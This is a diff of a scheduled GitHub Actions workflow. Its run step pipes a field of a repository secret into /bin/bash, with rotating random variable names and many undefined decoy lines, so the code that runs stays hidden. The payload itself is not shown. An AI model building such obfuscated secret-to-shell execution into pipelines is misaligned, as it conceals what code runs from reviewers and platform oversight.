@@ -2,8 +2,8 @@ name: lianzhongfeiqian
 on:
   workflow_dispatch:
   schedule:
-    - cron: '56 4/6 * * *'
-jobs:  # 22933
+    - cron: '30 4/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -11,26 +11,21 @@ jobs:  # 22933
       - uses: actions/checkout@v4
       - name: lianzhongfeiqian
         env:
-          d13075: ${{ secrets.d13075 }}
+          xmqu610: ${{ secrets.xmqu610 }}
         run: |
-          echo $d13075 | jq -r .akdb6 | /bin/bash
-          echo $jzamw4 | jq -r .qv17 | /bin/bash
-          echo $p37 | jq -r .acl5853 | /bin/bash
-          echo $maxkv0751 | jq -r .scp9527 | /bin/bash
-          echo $eywhv42 | jq -r .fwq46825 | /bin/bash
-          echo $lj34 | jq -r .ilqp15 | /bin/bash
-          echo $c6 | jq -r .afwvy8 | /bin/bash
-          echo $nlb08 | jq -r .no17167 | /bin/bash
-          echo $ehj68156 | jq -r .u10 | /bin/bash
-          echo $w12 | jq -r .qvbrv1880 | /bin/bash
-          echo $wk753 | jq -r .tsbk8 | /bin/bash
-          echo $kvsxh72 | jq -r .g333 | /bin/bash
-          echo $mnl0074 | jq -r .ysgv6 | /bin/bash
-          echo $aehq54294 | jq -r .io9124 | /bin/bash
-          echo $cw9 | jq -r .xtdk3394 | /bin/bash
-          echo $x5 | jq -r .hufa30 | /bin/bash
-          echo $vlrfo35 | jq -r .spzf167 | /bin/bash
-          echo $hb298 | jq -r .boq6487 | /bin/bash
-          echo $kwag7 | jq -r .rp96 | /bin/bash
-          echo $goj40198 | jq -r .hxsaa9989 | /bin/bash
+          echo $xmqu610 | jq -r .nbulr61702 | /bin/bash
+          echo $kexdq03336 | jq -r .cfg7173 | /bin/bash
+          echo $toif7192 | jq -r .rltx7 | /bin/bash
+          echo $qt3 | jq -r .f817 | /bin/bash
+          echo $eazf04 | jq -r .lnkg8784 | /bin/bash
+          echo $gouu9726 | jq -r .wjxn75 | /bin/bash
+          echo $kq42 | jq -r .vjxd33035 | /bin/bash
+          echo $rqtt4 | jq -r .nu79 | /bin/bash
+          echo $u27752 | jq -r .yocs21 | /bin/bash
+          echo $up61581 | jq -r .haeuy575 | /bin/bash
+          echo $qpug8 | jq -r .o4 | /bin/bash
+          echo $cjey7 | jq -r .c205 | /bin/bash
+          echo $tnpd23 | jq -r .gpow4 | /bin/bash
+          echo $uq458 | jq -r .y92792 | /bin/bash
+          echo $lnptn2789 | jq -r .dsisc312 | /bin/bash
 
